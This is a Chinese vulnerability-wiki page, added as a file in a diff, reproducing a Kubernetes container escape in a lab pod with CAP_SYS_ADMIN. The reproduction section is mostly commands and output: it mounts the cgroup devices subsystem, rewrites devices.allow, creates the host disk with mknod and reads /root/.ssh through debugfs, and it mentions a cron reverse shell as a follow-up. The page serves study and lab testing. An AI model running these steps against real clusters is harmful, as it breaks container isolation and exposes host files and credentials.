@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/%E4%BA%91%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/%E6%8C%82%E8%BD%BD%E9%87%8D%E5%86%99%20cgroup%20devices.allow%20%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">
+    <link rel="shortcut icon" href="../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>挂载重写 cgroup devices.allow 导致容器逃逸 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u6302\u8f7d\u91cd\u5199 cgroup devices.allow \u5bfc\u81f4\u5bb9\u5668\u9003\u9038", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u73af\u5883\u642d\u5efa", url: "#_2" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_3" },
+              {title: "\u73af\u5883\u590d\u539f", url: "#_4" },
+              {title: "YAML", url: "#yaml" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E6%BC%8F%E6%B4%9E/Huggingface%20Transformers%20Checkpoint%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2024-3568/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E6%BC%8F%E6%B4%9E/Huggingface%20Transformers%20Checkpoint%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2024-3568/" class="btn btn-xs btn-link">
+        Huggingface Transformers Checkpoint 反序列化漏洞 CVE-2024-3568
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E6%8C%82%E8%BD%BD%E5%AE%BF%E4%B8%BB%E6%9C%BA%20procfs%20%E7%B3%BB%E7%BB%9F%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E6%8C%82%E8%BD%BD%E5%AE%BF%E4%B8%BB%E6%9C%BA%20procfs%20%E7%B3%BB%E7%BB%9F%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/" class="btn btn-xs btn-link">
+        挂载宿主机 procfs 系统导致容器逃逸
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="cgroup-devicesallow">挂载重写 cgroup devices.allow 导致容器逃逸<a class="headerlink" href="#cgroup-devicesallow" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>在具有 <code>CAP_SYS_ADMIN</code> 权限的容器中，通过挂载并重写容器内的 <code>/sys/fs/cgroup/devices/devices.allow</code> 文件，解除 cgroup 设备访问限制，从而逃逸特权容器并访问宿主机内的文件。</p>
+<p>devices 子系统用于配制允许或者阻止 cgroup 中的 task 访问某个设备，起到黑白名单的作用，主要包含以下文件：</p>
+<ol>
+<li>devices.allow：cgroup 中的 task 能够访问的设备列表，格式为 <code>type major:minor access</code></li>
+<li>devices.deny：cgroup 中任务不能访问的设备，和上面的格式相同</li>
+<li>devices.list：列出 cgroup 中设备的黑名单和白名单</li>
+</ol>
+<p>漏洞利用原理：</p>
+<ol>
+<li>创建空目录挂载 cgroup devices 子系统</li>
+<li>确定当前容器对应的子 cgroup 位置</li>
+<li>设置其 devices.allow 文件为 <code>a</code>，表示所有设备均可访问</li>
+<li>获得宿主机的设备 major 和 minor</li>
+<li>通过 mknod 根据设备 major 和 minor 手动创建设备文件</li>
+<li>利用 debugfs 或直接挂载设备文件访问宿主机文件</li>
+<li>设置宿主机定时任务等方式反弹 shell</li>
+</ol>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://github.com/cdk-team/CDK/wiki/Exploit:-rewrite-cgroup-devices">https://github.com/cdk-team/CDK/wiki/Exploit:-rewrite-cgroup-devices</a></li>
+<li><a href="https://blog.nsfocus.net/docker/">https://blog.nsfocus.net/docker/</a></li>
+</ul>
+<h2 id="_2">环境搭建<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>基础环境准备（Docker + Minikube + Kubernetes），可参考 <a href="https://github.com/Threekiii/Awesome-POC/blob/master/%E4%BA%91%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/Kubernetes%20%2B%20Ubuntu%2018.04%20%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.md">Kubernetes + Ubuntu 18.04 漏洞环境搭建</a> 完成。</p>
+<p>本例中各组件版本如下：</p>
+<div class="highlight"><pre><span></span><code>Docker version: 18.09.3
+minikube version: v1.35.0
+Kubectl Client Version: v1.32.3
+Kubectl Server Version: v1.32.0
+</code></pre></div>
+<p>通过 yaml 文件创建漏洞环境：</p>
+<div class="highlight"><pre><span></span><code>kubectl apply -f k8s_metarget_namespace.yaml
+kubectl apply -f cap_sys_admin-container.yaml
+</code></pre></div>
+<p>执行完成后，K8s 集群内 <code>metarget</code> 命名空间下将会创建一个名为 <code>cap-sys-admin-container</code> 的 pod：</p>
+<div class="highlight"><pre><span></span><code>kubectl get pods -n metarget
+-----
+NAME                      READY   STATUS    RESTARTS   AGE
+cap-sys-admin-container   1/1     Running   0          55s
+</code></pre></div>
+<p><img alt="" src="../images/%E6%8C%82%E8%BD%BD%E9%87%8D%E5%86%99%20cgroup%20devices.allow%20%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/image-20250603142938639.png" /></p>
+<h2 id="_3">漏洞复现<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>进入 pod 进行漏洞利用：</p>
+<div class="highlight"><pre><span></span><code>kubectl exec -n metarget -it cap-sys-admin-container -- /bin/bash
+</code></pre></div>
+<ul>
+<li>第一步，创建空目录挂载 cgroup devices 子系统：</li>
+</ul>
+<div class="highlight"><pre><span></span><code>root@cap-sys-admin-container:/# mkdir /tmp/dev &amp;&amp; mount -t cgroup -o devices devices /tmp/dev
+</code></pre></div>
+<ul>
+<li>第二步，确定当前容器对应的子 cgroup 位置：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="c1"># 通过 docker info | grep -i cgroup 查看 Cgroup Driver</span>
+<span class="c1"># Cgroup Driver: cgroupfs 驱动则执行：</span>
+root@cap-sys-admin-container:/#<span class="w"> </span>cat<span class="w"> </span>/proc/self/cgroup<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>docker<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-1<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span><span class="s1">&#39;s/.*\/docker\/\(.*\)/\1/g&#39;</span>
+f873f626e2cbc74eeae5c2b5c624f7fe1ed92e26b37a244d30d70403a1802ee8/kubepods/besteffort/pod0b4bfb60-28b0-42bf-8ec4-6907aa6fe271/8233389d820eb154868c9d14dfe6c902202003b24e53a77811ecf9c8daf0776a
+root@cap-sys-admin-container:/#<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>/tmp/dev/docker/f873f626e2cbc74eeae5c2b5c624f7fe1ed92e26b37a244d30d70403a1802ee8/kubepods/besteffort/pod0b4bfb60-28b0-42bf-8ec4-6907aa6fe271/8233389d820eb154868c9d14dfe6c902202003b24e53a77811ecf9c8daf0776a
+
+<span class="c1"># Cgroup Driver: systemd 驱动则执行：</span>
+mount<span class="w"> </span>-l<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>kubepods
+-----
+cgroup<span class="w"> </span>on<span class="w"> </span>/sys/fs/cgroup/systemd/kubepods.slice/kubepods-burstable.slice/xxx<span class="w"> </span><span class="nb">type</span><span class="w"> </span>cgroup<span class="w"> </span><span class="o">(</span>rw,nosuid,nodev,noexec,relatime,xattr,release_agent<span class="o">=</span>/usr/lib/systemd/systemd-cgroups-agent,name<span class="o">=</span>systemd<span class="o">)</span><span class="w"> </span>
+-----
+<span class="nb">cd</span><span class="w"> </span>/tmp/dev/kubepods.slice/kubepods-burstable.slice/xxx
+</code></pre></div>
+<ul>
+<li>第三步，设置其 devices.allow 文件为 <code>a</code>，表示所有设备均可访问：</li>
+</ul>
+<div class="highlight"><pre><span></span><code>root@cap-sys-admin-container:/tmp/dev/docker/f873f626e2cbc74eeae5c2b5c624f7fe1ed92e26b37a244d30d70403a1802ee8/kubepods/besteffort/podeda81e29-d18b-
+45e5-af93-1ba96c6f02e1/979a724c1ad544b8bbd8bbb8ec6ce2ca1f61ffe3ddd9088c8242d7238a7a647b# echo a &gt; devices.allow &amp;&amp; cd /tmp
+</code></pre></div>
+<ul>
+<li>第四步，获得宿主机的设备 major 和 minor：</li>
+</ul>
+<div class="highlight"><pre><span></span><code>root@cap-sys-admin-container:/tmp# cat /proc/self/mountinfo | grep /etc | awk &#39;{print $3,$8}&#39; | head -1
+8:1 ext4
+</code></pre></div>
+<ul>
+<li>第五步，通过 mknod 根据设备 major 和 minor 手动创建设备文件：</li>
+</ul>
+<div class="highlight"><pre><span></span><code>root@cap-sys-admin-container:/tmp# mknod host b 8 1
+</code></pre></div>
+<ul>
+<li>第六步，利用 debugfs 或直接挂载设备文件访问宿主机文件：</li>
+</ul>
+<div class="highlight"><pre><span></span><code>root@cap-sys-admin-container:/tmp# debugfs host
+debugfs: ls  -l /root/.ssh
+ 6291704   40755 (2)      0      0    4096 21-Apr-2025 09:59 .
+ 6291457   40700 (2)      0      0    4096  3-Jun-2025 06:26 ..
+ 6291718  100644 (1)      0      0     553 21-Apr-2025 09:59 authorized_keys
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="c1"># 如果是 ext2/ext3/ext4 文件系统，可以用 debugfs 查看目录</span>
+<span class="c1"># 如果是 xfs 文件系统，不支持 debugfs，需要挂载</span>
+root@cap-sys-admin-container:/tmp#<span class="w"> </span>mkdir<span class="w"> </span>/tmp/host_dir<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>mount<span class="w"> </span>host<span class="w"> </span>/tmp/host_dir
+root@cap-sys-admin-container:/tmp#<span class="w"> </span>ls<span class="w"> </span>-l<span class="w"> </span>/tmp/host_dir/root/.ssh
+</code></pre></div>
+<p><img alt="" src="../images/%E6%8C%82%E8%BD%BD%E9%87%8D%E5%86%99%20cgroup%20devices.allow%20%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/image-20250603152409473.png" /></p>
+<p>也可以通过 <a href="https://github.com/cdk-team/CDK">CDK</a> 复现。下载 CDK ，将其传入容器 ：</p>
+<div class="highlight"><pre><span></span><code>kubectl cp cdk cap-sys-admin-container:/ -n metarget
+kubectl exec -n metarget -it cap-sys-admin-container -- chmod +x /cdk
+</code></pre></div>
+<p><img alt="" src="../images/%E6%8C%82%E8%BD%BD%E9%87%8D%E5%86%99%20cgroup%20devices.allow%20%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/image-20250603143413513.png" /></p>
+<p>重写当前容器内的 <code>/sys/fs/cgroup/devices/devices.allow</code>，逃逸特权容器访问宿主机内的文件：</p>
+<p><img alt="" src="../images/%E6%8C%82%E8%BD%BD%E9%87%8D%E5%86%99%20cgroup%20devices.allow%20%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/image-20250603143435283.png" /></p>
+<h2 id="_4">环境复原<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>kubectl delete -f cap_sys_admin-container.yaml
+kubectl delete -f k8s_metarget_namespace.yaml
+</code></pre></div>
+<h2 id="yaml">YAML<a class="headerlink" href="#yaml" title="Permanent link">&para;</a></h2>
+<p><a href="https://github.com/Metarget/metarget/blob/master/vulns_cn/configs/pods/cap_sys_admin-container.yaml">cap_sys_admin-container.yaml</a></p>
+<div class="highlight"><pre><span></span><code>apiVersion: v1
+kind: Pod
+metadata:
+  name: cap-sys-admin-container
+  namespace: metarget
+  annotations:
+    container.apparmor.security.beta.kubernetes.io/ubuntu: unconfined
+spec:
+  containers:
+  - name: ubuntu
+    image: ubuntu:latest
+    imagePullPolicy: IfNotPresent
+    securityContext:
+      capabilities:
+        add: [&quot;SYS_ADMIN&quot;]
+    # Just spin &amp; wait forever
+    command: [ &quot;/bin/bash&quot;, &quot;-c&quot;, &quot;--&quot; ]
+    args: [ &quot;while true; do sleep 30; done;&quot; ]
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E6%BC%8F%E6%B4%9E/Huggingface%20Transformers%20Checkpoint%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2024-3568/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E6%BC%8F%E6%B4%9E/Huggingface%20Transformers%20Checkpoint%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2024-3568/" class="btn btn-xs btn-link">
+        Huggingface Transformers Checkpoint 反序列化漏洞 CVE-2024-3568
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E6%8C%82%E8%BD%BD%E5%AE%BF%E4%B8%BB%E6%9C%BA%20procfs%20%E7%B3%BB%E7%BB%9F%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E6%8C%82%E8%BD%BD%E5%AE%BF%E4%B8%BB%E6%9C%BA%20procfs%20%E7%B3%BB%E7%BB%9F%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/" class="btn btn-xs btn-link">
+        挂载宿主机 procfs 系统导致容器逃逸
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
